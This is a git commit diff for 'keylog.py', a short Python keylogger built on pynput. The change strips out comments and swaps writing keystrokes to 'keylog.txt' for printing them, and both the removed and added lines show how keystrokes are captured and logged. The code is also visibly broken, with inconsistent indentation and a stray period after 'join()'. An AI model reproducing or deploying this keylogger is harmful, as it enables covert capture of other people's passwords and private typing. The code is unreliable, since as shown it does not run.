318f38af121675cb114e2b114f73447736208773
Harish <126079480+Harish-2608@users.noreply.github.com>
2024-10-19 11:56:21 +0530

    Update keylog.py

--- keylog.py
+++ keylog.py
@@ -1,14 +1,14 @@
-import pynput.keyboard                   #pynput lib is user for listen the keyboard events
+import pynput.keyboard                   
 
-log = " "                                #global variable
+log = " "                               
 
 def process_key_press(key):               
 	global log
-	log = log + str(key)                #get values are converted into str
-	 with open("keylog.txt", "a") as file:    # Open a file called keylog.txt in append mode
-        file.write(str(key) + "\n")       # Write the key and a newline to the file
+	log = log + str(key)                
+	 print(log)     
 	
 	
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)           #t listens for keypress events.
-with keyboard_listener:                # It makes sure the listener runs in a context where it can capture key presses.
-	keyboard_listener.join()           #This makes the listener continue running and listening for key presses indefinitely until the program is stopped.
+keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)           
+with keyboard_listener:                
+	keyboard_listener.join()          .
+ 
